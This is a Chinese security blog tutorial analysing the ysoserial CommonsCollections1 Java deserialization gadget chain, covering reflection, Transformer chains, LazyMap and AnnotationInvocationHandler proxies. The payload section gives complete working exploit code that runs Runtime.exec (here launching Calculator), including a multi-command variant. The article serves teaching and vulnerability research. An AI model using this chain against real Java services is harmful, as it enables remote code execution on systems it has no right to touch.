# Ysoserial CommonsCollections1 详细分析

阅读量 **239047**

|评论 **2**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-02-07 14:30:18

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t0174eb23885b859a66.jpg)

前面介绍了ysoserial工具的结构以及一些使用方法，最终自己构造利用链添加在ysoserial的工具中。为了更好的认识反序列化漏洞的相关利用，从本节开始介绍在ysoserial工具中出现的反序列化漏洞利用链。先看CommonsCollections1的相关研究与分析，目前互联网上存在不少关于该利用链的分析，有的写得逻辑不对，有的分析的不全面，特别是遗漏了具体的知识点和payload编写方法。我打算从以下几个角度思考CommonsCollections1利用链的具体构造方法

  1. 反序列化链的终点
  2. 反序列化链中“链”的艺术
  3. Payload编写方法
  4. 技术点总结

文中涉及到的技术点加粗标识

## 0x01 反序列化链的终点

在漏洞挖掘领域一个很重要的分析方法就是从最终的命令执行点或是触发点分析，可以很好理解漏洞的整个利用形态。同时分析编写反序列化链的基本功就是理解并掌握最后命令触发方式。

在ysoserial 工具中与CommonsCollections1使用同一个命令执行点的链为  
CommonsCollections5  
CommonsCollections6  
CommonsCollections7

当然其他的链也用形同的基础技术细节，只不过最后的执行方式不同，下面详细的介绍这类命令执行有什么的特点和利用方法

###  0x1 类与反射

Java反序列化难就难在利用了大量的Java编程的基础知识，以至于在整个利用链中到处都是这种知识的利用。因此我在写反序列化利用链分析的时候尽可能的把知识点分析清楚，在命令终点处第一个需要理解的概念就是什么是类什么是
_反射_ 。

大佬们写文章分析反序列化总忽略在反射时的相关概念。这里我提一嘴，我们都知道反射是Java代码动态加载运行的关键技术，这使得Java代码的灵活性大大提高。Java属于面向对象语言，类这个词在Java代码中频繁的出现，但是类的背后是什么却鲜为人知。

**1\. Class 类**

反射技术的基础就是每个类都有个Class对象，Class本来是个类，这个要与class分清楚（这里的class是类型）。每个类在JVM加载运行的时候都会new一个Class对象出来保存类的一些方法和属性，并与类相对应。用图表示如下

![](https://p1.ssl.qhimg.com/t0137b96007a5a86e2f.png)

Class类的构造方法为private属性，也就是只能类内部调用，类实现关系和构造方法如下所示：

![](https://p0.ssl.qhimg.com/t017e5a773881369d6e.png)

以String类为例创建方法如下，当JVM加载String类时，它首先读取String.class文件到内存，然后，为String类创建一个Class实例并关联起来：

    
    
    Class cls = new Class(String);
    

从cls的创建方式上讲，String和Class知识简单的依赖关系，Class依赖String保存一些String的相关信息，不要理解是有继承和实现的关系。

**2\. 获取Class对象**

我们可以通过以下三种方法获取Class对象

    
    
    Class str = String.class;
    Class str = new String().getClass();
    Class str = Class.forName("java.lang.String");
    

在Class类中包含着很多方法函数，其中在本章节使用最频繁的就是

  * getMethod
  * invoke

这些函数也是反射的关键函数，需要注意的是 **这些函数只存在于Class类和对象中** ，这对于理解反序列化链的payload有着很大的帮助。

**3\. 反射的基本用法**

反射又有很多琐碎的点，这里只讲它的基本用法如果当前拥有一个对象的话，那么可以动态的调用该对象的所有方法

    
    
    // Step1 获取Class对象
    Class cls = obj.getClass();
    // Step2 获取想要的方法对象
    Method mth = cls.getMethod("MethodName",new Class[]{arg1_type,arg2_type});    
    // Step3 调用方法
    mth.invoke(obj,new Object[]{arg1,arg2})
    

这里注意的是getMethod的第二个参数为Class数组，Class的概念我们之前也提到过。

###  0x2 基于接口的多态

介绍过类与反射之后，看一下CommonsCollections1 链里的实现技术，基于接口的多态，这里的接口指的是 Transformer，定义如下

![](https://p4.ssl.qhimg.com/t01d568c51fd696db84.png)

他的实现类有很多，如下图所示

![](https://p5.ssl.qhimg.com/t01d84d2f12f51a918a.png)

我们再看一看ChainedTransformer类中关于Transformer变量的定义

    
    
    ChainedTransformer::private final Transformer[] iTransformers;
    

iTransformers的类型为Transformer接口，这就意味着可以通过向上转型的方式将它的三个实现类利用多态的能力填充在Transformer数组中，之后配合ChainedTransformer的transform方法，链式的调用iTransformers数组中Transformer类型的transform方法

其中ChainedTransformer的transform方法如下

    
    
    public Object transform(Object object) {
            for (int i = 0; i < iTransformers.length; i++) {
                object = iTransformers[i].transform(object);
            }
            return object;
        }
    

###  0x3 命令执行终点

关于类、反射和多态的概念理解清楚之后，我们分析下本节的重点，CommonsCollections1链命令执行的终点。

在InvokerTransformer中的transform方法如下

    
    
    public Object transform(Object input) {
        if (input == null) {
            return null;
        }
        try {
            Class cls = input.getClass();
            Method method = cls.getMethod(iMethodName, iParamTypes);
            return method.invoke(input, iArgs);
            ...
    

这里有反射获取方法并调用的操作，因此需要通过一系列的invoke执行exec指令，看下最简单的方法

    
    
    Transformer tf = new InvokerTransformer("exec",new Class[] { String.class }, new Object[]{ "calc"});
    tf.transform(Runtime.getRuntime());
    

这里涉及到一个坑，在反序列化的时候函数中涉及到的对象必须是实现了Serializable接口，但是在这里Runtime.getRuntime()得到的是Runtime对象，然而Runtime对象是没有实现反序列化接口的所以，这里不能这么写。要通过ChainedTransformer
实现最终的执行链。

    
    
    Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
            new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
            new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"/System/Applications/Calculator.app/Contents/MacOS/Calculator"})
    };
    

以上是现成的执行链，其中有很多特殊的构造技巧，比如ConstantTransformer不论transform函数参数是什么，都会返回ConstantTransformer的构造参数。第一句和第二句的组合相当于执行以下语句

    
    
    Method aa = (Method) Runtime.class.getClass().getMethod("getMethod",new Class[] {String.class, Class[].class }).invoke(Runtime.class,new Object[]{"getRuntime",new Class[0]});
    

梳理下该执行语句的关系图

![](https://p5.ssl.qhimg.com/t01376aa4f21171a196.png)

如图所示总结几点

  * getMethod，invoke方法必须由绿色的类调用
  * a2虽然没有Runtime类中的方法，但是可以生成Runtime中的方法类
  * 每个类对应一个Class对象如图所示

这所有的一切又是那么的明白，之后调用getRuntime
Method对象的invoke执行该方法，获得getRuntime类，再去调用exec函数，这就是最后的命令执行点，坑点还很多好好消化消化。

###  0x4 新的起点之多命令执行

命令执行这就结束了吗，其实我们可以通过ChainedTransformer实现多命令执行，仔细思考下这个执行链的构造。

ChainedTransformer的iTransformers为Transformer类型，那么数组元素也可以为类自身，这就可以实现多个链的连环触发了，构造如下：

    
    
    //构造Transformer数组
    final Transformer[] transformers1 = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[] {
        String.class, Class[].class }, new Object[] {
        "getRuntime", new Class[0] }),
    new InvokerTransformer("invoke", new Class[] {
        Object.class, Object[].class }, new Object[] {
        null, new Object[0] }),
    new InvokerTransformer("exec",
        new Class[] { String.class }, execArgs),
    new ConstantTransformer(1) };
    
    
    //将ChainedTransformer设为数组元素
    final Transformer[] transformers2 = new Transformer[] {
    new ChainedTransformer(transformers1),new ChainedTransformer(transformers1)
    };
    
    //将Transformer[]类型变量设为构造参数
    final Transformer transformerChain = new ChainedTransformer(
                transformers2);
    

## 0x02 反序列化链中“链”的艺术

本节正式介绍CommonsCollections1 整个利用链的原理和触发方式

    
    
    /*
    Gadget chain:
        ObjectInputStream.readObject()
            AnnotationInvocationHandler.readObject()
                Map(Proxy).entrySet()
                    AnnotationInvocationHandler.invoke()
                        LazyMap.get()
                            ChainedTransformer.transform()
                                ConstantTransformer.transform()
                                InvokerTransformer.transform()
                                    Method.invoke()
                                        Class.getMethod()
                                InvokerTransformer.transform()
                                    Method.invoke()
                                        Runtime.getRuntime()
                                InvokerTransformer.transform()
                                    Method.invoke()
                                        Runtime.exec()
    
    Requires:
        commons-collections
     */
    

###  0x1 触发ChainedTransformer transform 方法

首先回顾上一节的命令执行的触发点为ChainedTransformer类的transform方法，如下图所示

![](https://p0.ssl.qhimg.com/t0190086d1249337f58.png)

###  0x2 触发LazyMap get方法

那么谁来调用这个transform方法呢，可以发现在LazyMap的get方法中有一处调用，如下图所示

![](https://p0.ssl.qhimg.com/t01c019241b673fe312.png)

变量factory为何物，由LazyMap的构造方法追到factory为Transformer类型的变量

![](https://p3.ssl.qhimg.com/t01ba108fa55fee5763.png)

所以上面的ChainedTransformer可以通过构造方法与LazyMap关联

![](https://p5.ssl.qhimg.com/t018bcb045a00f7c525.png)

###  0x3 触发AnnotationInvocationHandler invoke方法

LazyMap搞定后，就是想如何触发其中的get方法，这时有如下代码

![](https://p2.ssl.qhimg.com/t015eaeb89db3180db2.png)

![](https://p3.ssl.qhimg.com/t01a7205bc39beb3632.png)

正好在AnnotationInvocationHandler
invoke方法中调用想要的map类的get方法，同时只需要在构造方法处传入LazyMap即可，这些都不是问题。

![](https://p1.ssl.qhimg.com/t01a31c5b2ac336b903.png)

###  0x4 代理类触发 invoke

invoke方法很特殊，看先AnnotationInvocationHandler实现了InvocationHandler接口

    
    
    class AnnotationInvocationHandler implements InvocationHandler, Serializable {
       ......
        }
    

该接口可以用来实现 **JDK代理** ，代理的概念如果是刚听说还是有点迷糊的，简答的介绍下。

JDK代理的主要函数为 ，Proxy.newProxyInstance

![](https://p0.ssl.qhimg.com/t01502a3f83e7a7e605.png)

通过向该函数传递ClassLoader，interfaces，和重写invoke方法的InvocationHandler实现类即可实现代理。JDK代理是基于接口的，因为在本身在实现的时候是继承实现的，由于继承是单继承所以只能依靠接口。代理成功之后再调用原来类方法的时候会首先调用InvocationHandler实现类的invoke方法。

同时发现在readObject方法中有memberValues的方法调用，所以我们可以把memberValues设置为代理类，当调用entrySet方法时触发代理类的invoke方法。

![](https://p1.ssl.qhimg.com/t012f7027c5f2e5990b.png)

## 0x03 Payload编写方法及测试

本节介绍Payload的编写方法，根据之前分析的调用链，可以很清楚的编写整个利用。

###  0x1 Payload编写

首先构造Transformer类型的执行链

    
    
    Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
        new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
        new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"/System/Applications/Calculator.app/Contents/MacOS/Calculator"})
    };
    Transformer transformerChain = new ChainedTransformer(transformers);
    

* * *

生成LazyMap

    
    
    final Map innerMap = new HashMap();
    final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
    

* * *

生成代理类Handler，需要注意的是AnnotationInvocationHandler的构造方法是default限定符，所以需要外包无法直接访问。这里采用第3行，将构造方法设置为public属性，在创建实例的时候将lazyMap添加在构造方法参数中即可。

    
    
    String classToSerialize = "sun.reflect.annotation.AnnotationInvocationHandler";
    final Constructor<?> constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
    constructor.setAccessible(true);
    InvocationHandler secondInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);
    

* * *

有了handler之后，生成Proxy对象，这里的代理对象为一个HashMap，代码如下所示，代理完成之后调用testMap方法时会首先调用secondInvocationHandler中invoke方法的内容，而这个Handler的memberValues为lazyMap，所以就会触发invoke中的get方法。

    
    
    final Map testMap = new HashMap();
    Map evilMap = (Map) Proxy.newProxyInstance(
            testMap.getClass().getClassLoader(),
            testMap.getClass().getInterfaces(),
            secondInvocationHandler
    );
    

* * *

生成AnnotationInvocationHandler对象，为了调用Object中memberValues的entrySet方法，需要再次实例化AnnotationInvocationHandler类，这是将代理类作为构造方法的第二个参数，调用序列化和反序列化函数，成功触发漏洞。

    
    
    final Constructor<?> ctor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
    ctor.setAccessible(true);
    final InvocationHandler handler = (InvocationHandler) ctor.newInstance(Override.class, evilMap);
    byte[] serializeData=serialize(handler);
    unserialize(serializeData);
    

###  0x2 编写测试代码

实现两个功能，序列化类和反序列化类代码如下

    
    
    public static byte[] serialize(final Object obj) throws Exception {
        ByteArrayOutputStream btout = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(btout);
        objOut.writeObject(obj);
        return btout.toByteArray();
    }
    public static Object unserialize(final byte[] serialized) throws Exception {
        ByteArrayInputStream btin = new ByteArrayInputStream(serialized);
        ObjectInputStream objIn = new ObjectInputStream(btin);
        return objIn.readObject();
    }
    

###  0x3 完整代码

将上述代码按照顺序整合，最终成功调用计算器

    
    
    public class cc1test {
        public static byte[] serialize(final Object obj) throws Exception {
            ByteArrayOutputStream btout = new ByteArrayOutputStream();
            ObjectOutputStream objOut = new ObjectOutputStream(btout);
            objOut.writeObject(obj);
            return btout.toByteArray();
        }
        public static Object unserialize(final byte[] serialized) throws Exception {
            ByteArrayInputStream btin = new ByteArrayInputStream(serialized);
            ObjectInputStream objIn = new ObjectInputStream(btin);
            return objIn.readObject();
        }
        public static void main(String[] args) throws Exception{
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                    new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"/System/Applications/Calculator.app/Contents/MacOS/Calculator"})
            };
            Transformer transformerChain = new ChainedTransformer(transformers);
            final Map innerMap = new HashMap();
    
            final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
            String classToSerialize = "sun.reflect.annotation.AnnotationInvocationHandler";
            final Constructor<?> constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
            constructor.setAccessible(true);
            InvocationHandler secondInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);
    
            final Map testMap = new HashMap();
    
            Map evilMap = (Map) Proxy.newProxyInstance(
                    testMap.getClass().getClassLoader(),
                    testMap.getClass().getInterfaces(),
                    secondInvocationHandler
            );
            final Constructor<?> ctor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
            ctor.setAccessible(true);
            final InvocationHandler handler = (InvocationHandler) ctor.newInstance(Override.class, evilMap);
            byte[] serializeData=serialize(handler);
            unserialize(serializeData);
        }
    }
    

完整代码放在了github上 <https://github.com/BabyTeam1024/ysoserial_analyse>

## 0x04 技术点总结

整个CommonsCollections1链看起来挺简单，但背后的知识点确实挺多，总结下如果不太清楚的点可以单独学习

  * 类与反射
  * 基于接口的多态
  * JDK动态代理
  * AnnotationInvocationHandler 做类与代理类
  * LazyMap与HashMap
  * 序列化与反序列化函数

## 0x05 问题分析

  1. 为什么构建AnnotationInvocationHandler类是用反射的方法？  
因为AnnotationInvocationHandler的构造方法修饰符限制问题，该类正常调用时最多只能在同一个包中调用，所以用构造器方法创建实例。

    1. 为什么AnnotationInvocationHandler创建两次实例？  
一次是生成代理类，一次是生成反序列化对象，职责不太一样。

    2. InvokerTransformer 在调用getMethod和invoke方法的时候，参数必须为Class数组吗？  
必须为Class数组，如下所示，这是因为getMethod和invoke方法在Class类里定义的方法参数为此形式

    
    
    new Class[] {String.class, Class[].class }
    new Class[] {Object.class, Object[].class}
    
    public Method getMethod(String name, Class<?>... parameterTypes)
    public Object invoke(Object obj, Object... args)
    

​

## 0x06 总结

详细分析完CommonsCollections1感觉收获了不少，之后会继续分析剩下的利用链，总结其中的知识点以及坑点。

## 参考文章

<https://xz.aliyun.com/t/8164?accounttraceid=ad01007c6ce44ff290f3a7ba07888b1avmus>  
<https://xz.aliyun.com/t/6787>  
<https://zhuanlan.zhihu.com/p/143840647>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **D4ck** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/230788](/post/id/230788)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [反序列化](/tag/反序列化)
  * [Java](/tag/Java)

 **+1** __3赞

 __收藏

![](https://p2.ssl.qhimg.com/t018452be330c01b353.png) D4ck

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

